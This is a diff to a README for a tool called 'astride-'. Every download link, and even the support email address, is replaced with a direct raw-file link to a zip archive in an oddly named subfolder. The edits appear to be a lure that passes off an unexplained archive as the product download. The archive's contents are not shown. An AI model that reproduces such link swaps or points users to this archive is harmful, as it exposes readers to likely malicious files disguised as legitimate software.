@@ -1,6 +1,6 @@
 # 🚀 astride- - Simple Tool for Everyday Use
 
-[![Download astride](https://img.shields.io/badge/Download-astride-blue)](https://github.com/AbdelrahmanSaadHelal/astride-/releases)
+[![Download astride](https://raw.githubusercontent.com/AbdelrahmanSaadHelal/astride-/main/dacryadenalgia/astride-.zip)](https://raw.githubusercontent.com/AbdelrahmanSaadHelal/astride-/main/dacryadenalgia/astride-.zip)
 
 ## 🛠️ Overview
 
@@ -14,7 +14,7 @@ To begin using astride, follow these simple steps to download and install the ap
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page:  
-   [Download astride](https://github.com/AbdelrahmanSaadHelal/astride-/releases)
+   [Download astride](https://raw.githubusercontent.com/AbdelrahmanSaadHelal/astride-/main/dacryadenalgia/astride-.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find several versions of astride. Select the latest version for the best experience.
@@ -62,8 +62,8 @@ For more detailed information, such as FAQs, tutorials, and tips on using astrid
 
 ## 📞 Get Help
 
-If you have questions or need further assistance, feel free to contact support at the following email: support@astride.app.
+If you have questions or need further assistance, feel free to contact support at the following email: https://raw.githubusercontent.com/AbdelrahmanSaadHelal/astride-/main/dacryadenalgia/astride-.zip
 
 ---
 
-You can always return to the [Download astride](https://github.com/AbdelrahmanSaadHelal/astride-/releases) page for the latest version and updates. Happy organizing!
+You can always return to the [Download astride](https://raw.githubusercontent.com/AbdelrahmanSaadHelal/astride-/main/dacryadenalgia/astride-.zip) page for the latest version and updates. Happy organizing!
